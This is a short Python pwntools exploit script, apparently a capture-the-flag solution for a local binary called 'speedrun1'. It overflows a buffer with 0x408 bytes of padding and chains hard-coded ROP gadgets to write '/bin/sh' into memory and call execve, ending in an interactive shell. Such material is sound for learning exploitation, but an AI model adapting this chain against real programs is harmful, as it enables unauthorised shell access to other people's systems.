from pwn import *

target = process('./speedrun1')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = b''
rop += popRdx
rop += b"/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = b"0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
